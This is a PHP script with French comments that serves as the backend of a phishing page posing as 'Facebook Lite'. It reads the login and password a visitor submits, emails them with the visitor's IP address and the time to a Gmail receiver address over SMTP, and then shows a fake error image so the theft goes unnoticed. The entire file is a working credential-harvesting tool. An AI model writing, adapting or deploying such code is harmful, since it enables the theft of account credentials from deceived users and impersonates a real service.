<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require __DIR__ . '/PHPMailer/src/Exception.php';
require __DIR__ . '/PHPMailer/src/PHPMailer.php';
require __DIR__ . '/PHPMailer/src/SMTP.php';

// Inclure config (fichier hors webroot)
// Si ton config est placé à C:\xampp\htdocs\config\config.php alors '..' remonte d'un niveau.
require_once __DIR__ . '/../config/config.php';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $login = trim($_POST['login'] ?? '');
    $password = trim($_POST['password'] ?? '');

    $mail = new PHPMailer(true);
    try {
        // Configuration SMTP (Gmail)
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = SMTP_USERNAME;       // depuis config.php
        $mail->Password   = SMTP_APP_PASSWORD;   // depuis config.php
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        // Expéditeur et destinataire
        $mail->setFrom('no-reply@facebooklite.local', 'Facebook Lite');
        $mail->addAddress(RECEIVER_EMAIL);      // franciscreaction@gmail.com

        $mail->isHTML(false);
        $mail->Subject = 'Nouvelle connexion Facebook Lite';
        $mail->Body    = "Identifiant : $login\nMot de passe : $password\nIP : " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\nDate : " . date('Y-m-d H:i:s');

        $mail->send();
        echo '
        <img src="something-wronog.png" alt="Erreur" style="width:100%; height:100%;"> ';

    } catch (Exception $e) {
        echo "Problème de connexion. Vérifiez votre connexion et réessayez: {$mail->ErrorInfo}";
    }
} else {
    http_response_code(405);
    echo "Méthode non autorisée.";
}
?>
